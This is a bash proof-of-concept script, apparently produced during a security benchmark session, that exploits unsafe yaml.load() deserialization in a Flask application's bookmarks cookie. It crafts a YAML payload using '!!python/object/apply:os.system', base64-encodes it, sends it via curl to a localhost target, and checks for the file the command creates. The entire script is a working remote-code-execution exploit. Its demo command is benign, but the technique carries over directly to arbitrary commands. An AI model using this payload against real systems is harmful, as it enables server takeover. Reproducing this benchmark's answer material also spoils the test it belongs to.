#!/bin/bash
# POC: YAML Deserialization RCE via bookmarks cookie - creates a malicious YAML payload that executes arbitrary commands through unsafe yaml.load()
# Target: ./repo
# Created: 2025-12-02T16:18:08.065Z
# Session: benchmark-XBEN-075-24-miorxjbp

# YAML Deserialization RCE POC
# Exploits unsafe yaml.load() in bookmarks cookie deserialization
# Target: Flask application at localhost:5000

TARGET_URL="http://localhost:5000/list"
TEST_FILE="/tmp/yaml_rce_test_$$"

# Create malicious YAML payload using Python object serialization
# This payload will execute: touch /tmp/yaml_rce_test_[PID]
MALICIOUS_YAML="- !!python/object/apply:os.system
  args: ['touch $TEST_FILE']"

# Base64 encode the payload
ENCODED_PAYLOAD=$(echo -n "$MALICIOUS_YAML" | base64 -w 0)

echo "[*] YAML Deserialization RCE POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Malicious payload: $MALICIOUS_YAML"
echo "[*] Base64 encoded: $ENCODED_PAYLOAD"
echo ""

# Check if target is reachable
echo "[*] Checking if target is reachable..."
if ! curl -s -m 5 "$TARGET_URL" > /dev/null 2>&1; then
    echo "[-] Target not reachable at $TARGET_URL"
    exit 1
fi

echo "[+] Target is reachable"
echo ""

# Execute exploit
echo "[*] Sending malicious bookmarks cookie..."
curl -s -b "user=test123;bookmarks=$ENCODED_PAYLOAD" "$TARGET_URL" > /dev/null 2>&1

# Wait a moment for command execution
sleep 1

# Verify if command was executed
if [ -f "$TEST_FILE" ]; then
    echo "[+] EXPLOIT SUCCESSFUL!"
    echo "[+] File created at: $TEST_FILE"
    ls -la "$TEST_FILE"
    rm -f "$TEST_FILE"
    exit 0
else
    echo "[-] Exploit failed - file was not created"
    exit 1
fi